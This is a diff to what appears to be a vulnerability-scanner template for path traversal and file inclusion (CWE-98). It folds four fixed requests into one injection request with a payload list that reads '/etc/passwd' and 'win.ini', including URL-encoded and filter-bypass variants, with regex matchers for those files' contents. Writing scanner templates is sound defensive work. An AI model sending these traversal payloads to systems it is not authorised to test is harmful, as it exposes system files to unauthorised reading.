@@ -8,57 +8,21 @@ info:
     cwe: "CWE-98"
 requests:
   - method: GET
-    path: "/page?file=../../../etc/passwd"
+    path: "/"
+    attack: inject
+    inject_in: query
+    payloads:
+      - "../../../etc/passwd"
+      - "..\\..\\..\\windows\\win.ini"
+      - "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"
+      - "....//....//....//etc/passwd"
     matchers:
       - type: regex
         part: body
         regex:
           - "root:.*:0:0:"
-          - "bin:.*:1:1:"
-          - "daemon:.*:2:2:"
-          - "nobody:.*:65534:"
-      - type: status
-        part: status
-        status:
-          - 200
-    matcher_condition: and
-
-  - method: GET
-    path: "/download?file=..\\..\\..\\windows\\win.ini"
-    matchers:
-      - type: word
-        part: body
-        words:
-          - "[fonts]"
-          - "[extensions]"
-          - "[files]"
+          - "\\[fonts\\]"
           - "for 16-bit app support"
-      - type: status
-        part: status
-        status:
-          - 200
-    matcher_condition: or
-
-  - method: GET
-    path: "/static/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"
-    matchers:
-      - type: regex
-        part: body
-        regex:
-          - "root:.*:0:0:"
-      - type: status
-        part: status
-        status:
-          - 200
-    matcher_condition: and
-
-  - method: GET
-    path: "/template?name=....//....//....//etc/passwd"
-    matchers:
-      - type: regex
-        part: body
-        regex:
-          - "root:.*:0:0:"
       - type: status
         part: status
         status:
